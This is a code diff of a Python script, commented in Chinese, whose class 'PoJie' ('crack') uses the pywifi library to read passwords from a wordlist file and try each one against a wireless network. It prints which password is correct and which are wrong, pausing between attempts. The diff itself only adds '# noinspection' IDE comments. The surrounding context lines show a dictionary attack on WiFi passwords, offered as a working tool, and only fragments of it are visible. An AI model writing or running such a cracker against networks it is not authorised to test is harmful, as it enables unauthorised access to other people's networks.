@@ -1,10 +1,14 @@
 # coding:utf-8
+# noinspection PyUnresolvedReferences
 import time  #时间
 import pywifi  #破解wifi
+# noinspection PyUnresolvedReferences
 from pywifi import const  #引用一些定义
+# noinspection PyUnresolvedReferences
 from asyncio.tasks import sleep
 class PoJie():
     def __init__(self,path):
+        # noinspection PyUnresolvedReferences
         self.file=open(path,"r",errors="ignore")
         wifi = pywifi.PyWiFi() #抓取网卡接口
         self.iface = wifi.interfaces()[0]#抓取第一个无限网卡
@@ -17,6 +21,7 @@ class PoJie():
             [const.IFACE_DISCONNECTED, const.IFACE_INACTIVE]
 
     def readPassWord(self):
+            # noinspection PyUnresolvedReferences
             print("开始破解：")
             while True:
 
@@ -26,9 +31,11 @@ class PoJie():
                         break
                     bool1=self.test_connect(myStr)
                     if bool1:
+                        # noinspection PyUnresolvedReferences
                         print("密码正确：",myStr)
                         break
                     else:
+                        # noinspection PyUnresolvedReferences
                         print("密码错误:"+myStr)
                     sleep(3)
                 except:
